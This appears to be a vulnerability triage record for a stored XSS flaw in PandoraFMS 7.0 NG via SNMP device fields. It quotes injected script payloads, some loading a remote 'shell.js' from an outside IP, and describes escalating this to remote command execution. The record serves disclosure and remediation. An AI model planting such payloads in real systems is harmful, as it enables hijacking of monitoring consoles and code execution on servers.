proposal.summary: PandoraFMS 7.0 NG ≤ 746 is vulnerable to persistent cross-site scripting (XSS) via SNMP device fields (syscontact, syslocation, sysname, sysDesc). An attacker can inject JavaScript that is stored and later executed in the PandoraFMS web console, enabling creation of a plugin and ultimately remote command execution via a crafted payload.
proposal.cwe_quote:
syscontact      <script>alert('AppleBois');</script>
syslocation     <script type="text/javascript" src='http://192.168.11.130/shell.js'></script>
sysname         <script type="text/javascript" src="http://192.168.11.130/shell.js"></script>
sysDesc		<script>alert('AppleBois');</script>

AV.quote: By asking network administrator to scan SNMP device to trigger Cross Site Scripting(XSS)

C.quote: We can call a remote JavaScript file to execute arbitrary code to reach Remote Code Execution on PandoraFMS.

I.quote: We can call a remote JavaScript file to execute arbitrary code to reach Remote Code Execution on PandoraFMS.

A.quote: We can call a remote JavaScript file to execute arbitrary code to reach Remote Code Execution on PandoraFMS.

proposal.recommended_next_step: Verify the stored XSS by reproducing the SNMP scan with controlled payload in a test environment, confirm JavaScript executes in the PandoraFMS web console, and identify affected pages and sanitize/encode SNMP-derived fields. If confirmed, prepare coordinated disclosure and mitigation guidance (input validation/escaping and CMS patch).
